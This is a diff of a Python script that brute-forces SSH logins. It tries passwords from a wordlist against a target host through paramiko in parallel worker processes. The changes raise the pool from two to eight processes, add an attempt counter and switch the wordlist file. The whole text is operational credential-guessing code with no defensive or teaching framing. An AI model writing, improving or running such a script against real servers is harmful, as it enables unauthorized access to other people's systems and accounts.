@@ -18,12 +18,14 @@ def get_arguments():
         parser.error("[-] Please specify a username, use --help for more info")
     return options 
 
-def ssh_attack(user,address,password,event,q):
+#def ssh_attack(user,address,password):
+def ssh_attack(user,address,password,event,q,i):
     if not event.is_set():
+        print(i)
+        i+=1
         print('Testing password: ' + password)
         try :
             ssh.connect(address, username=user, password=password)
-            array=password
             q.put(password)
             print(password)
             event.set()
@@ -50,14 +52,15 @@ if __name__ == '__main__':
     #this is to add new host automatically
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
-#preparing dictionnary to read passwords
+    #openning password dictionnary
     f = open('pass.txt','r')
-##############################3
-#Preparing the multiprocessing
-#Working with pool, because you cannot set the number of process with the process class
+
+    ################################
+    #Preparing the multiprocessing
+    #Working with pool, because you cannot set the number of process with the process class
 
     #Preparing the pool
-    pool = mp.Pool(processes=2)
+    pool = mp.Pool(processes=8)
 
     # Preparing the array to return the password value
 
@@ -68,18 +71,15 @@ if __name__ == '__main__':
     t1 = time.time()
 
     '''For Asynchronous'''
-    #for x in pass_list:
-    #    worker = pool.apply_async(ssh_attack, args=(options.user, options.target, x, event,queue))
-
-   # #while True:
-    with open('rockyou.txt','r') as f:
+    #with open('rockyou.txt','r',10000) as f:
+    i=0
+    with open('pass.txt','r') as f:
         for x in f:
             x = x.strip()
-            worker = pool.apply_async(ssh_attack, args=(options.user, options.target, x, event,queue))
-            #print(x, type(x))
+            worker = pool.apply_async(ssh_attack, args=(options.user, options.target, x, event,queue,i))
             if x.strip() == "" : continue
-    print("The password is " + queue.get())
 
+    print("The password is " + queue.get())
     print('Code executed in: '+ str(time.time() - t1))
     exit(0)
 
